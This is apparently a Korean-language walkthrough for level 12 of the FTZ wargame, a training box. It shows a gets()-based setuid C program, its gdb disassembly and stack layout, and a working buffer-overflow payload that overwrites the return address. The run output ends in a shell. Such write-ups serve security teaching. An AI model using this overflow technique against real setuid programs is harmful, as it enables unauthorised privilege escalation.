# **FTZ LEVEL12**

## <img src="http://freevector.co/wp-content/uploads/2014/07/61901-door-key.png" width="25"> **Keys**
>attackme.c
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
 
int main( void )
{
	char str[256];

 	setreuid( 3093, 3093 );
	printf( "문장을 입력하세요.\n" );
	gets( str );
	printf( "%s\n", str );
} 
```
`gets()` 를 통해 입력을 받기때문에 pipe 를 이용해야 한다.

gdb로 분석하면
```
(gdb) disas main
Dump of assembler code for function main:
0x08048470 <main+0>:	push   ebp
0x08048471 <main+1>:	mov    ebp,esp
0x08048473 <main+3>:	sub    esp,0x108
0x08048479 <main+9>:	sub    esp,0x8
0x0804847c <main+12>:	push   0xc15
0x08048481 <main+17>:	push   0xc15
0x08048486 <main+22>:	call   0x804835c <setreuid>
0x0804848b <main+27>:	add    esp,0x10
0x0804848e <main+30>:	sub    esp,0xc
0x08048491 <main+33>:	push   0x8048538
0x08048496 <main+38>:	call   0x804834c <printf>
0x0804849b <main+43>:	add    esp,0x10
0x0804849e <main+46>:	sub    esp,0xc
0x080484a1 <main+49>:	lea    eax,[ebp-264]
0x080484a7 <main+55>:	push   eax
0x080484a8 <main+56>:	call   0x804831c <gets>
0x080484ad <main+61>:	add    esp,0x10
0x080484b0 <main+64>:	sub    esp,0x8
0x080484b3 <main+67>:	lea    eax,[ebp-264] 
0x080484b9 <main+73>:	push   eax
0x080484ba <main+74>:	push   0x804854c
0x080484bf <main+79>:	call   0x804834c <printf>
0x080484c4 <main+84>:	add    esp,0x10
0x080484c7 <main+87>:	leave  
0x080484c8 <main+88>:	ret    
0x080484c9 <main+89>:	lea    esi,[esi]
0x080484cc <main+92>:	nop    
0x080484cd <main+93>:	nop    
0x080484ce <main+94>:	nop    
0x080484cf <main+95>:	nop    
End of assembler dump.
```
FTZ 11과 동일하게 환경변수를 이용해서 풀면 ( [환경변수 이용하기](https://github.com/papico0306/SystemHackingPractice/blob/master/FTZ_Solve/ftz11_solve.md "환경변수 이용하기") )
```
[level12@ftz level12]$ /tmp/ge EGG
EGG=0xbffffc3d
```

## <img src="https://pngimg.com/uploads/road/road_PNG24.png" width="25"> **Payload**
>메모리 구조
```
| str[256] | dummy[8] | sfp | ret |
```

>Payload
```
 (python -c "print 'A'*268+'\x3d\xfc\xff\xbf'";cat) | ./attackme
```

## <img src="https://maxcdn.icons8.com/windows8/PNG/512/Military/sword-512.png" width="25"> **Attack**
```
[level12@ftz level12]$ (python -c "print 'A'*268+'\x3d\xfc\xff\xbf'";cat) | ./attackme 
문장을 입력하세요.
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=?
my-pass
TERM environment variable not set.

Level13 Password is "~~~~~~~~~".

```